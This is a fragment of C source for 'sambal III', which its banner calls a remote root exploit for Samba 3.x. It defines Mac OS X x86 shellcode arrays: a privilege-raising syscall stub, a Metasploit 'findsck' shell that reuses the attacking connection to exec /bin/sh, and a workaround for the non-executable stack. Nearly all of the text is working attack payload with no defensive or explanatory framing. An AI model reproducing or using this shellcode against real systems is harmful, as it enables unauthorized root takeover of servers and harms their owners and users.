/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#define MAC_OS_X_SAFE_ADDRESS 0x01011101

unsigned int mac_os_x86_findsck_tag = 0x2166736d;

unsigned char
mac_os_x86_utf8_encoder_fix[] =

        /* Mac OS X has a non-executable stack. Our UTF8 encoder pushes the instructions to the stack, so we need to change this to another address.
        ** This is a very dirty hack but it seems to work. */

        "\x68"
        "\x11\x22\x33\x44"
        "\x5c";

unsigned char
mac_os_x86_findsck_shell[] =

        "\x31\xc0\xb0\x93\xcd\x80" 

        /* Get root privileges. .. */

        "\x90\x31\xc0\x50\x50\xb0\x17\xcd\x80"

        /* metasploit findsck shell */

        "\x31\xD2\x52\x89\xE6\x52\x52\xB2\x80"
        "\x52\xB6\x0C\x52\x56\x52\x52\x66\xFF"
        "\x46\xE8\x6A\x1D\x58\xCD\x80\x81\x3E"
        "\x6D\x73\x66\x21\x75\xEF\x5A\x5F\x6A"
        "\x02\x59\x6A\x5A\x58\x51\x57\x51\xCD"
        "\x80\x49\x79\xF5\x50\x68\x2F\x2F\x73"
        "\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50"
        "\x54\x53\x53\xB0\x3B\xCD\x80";

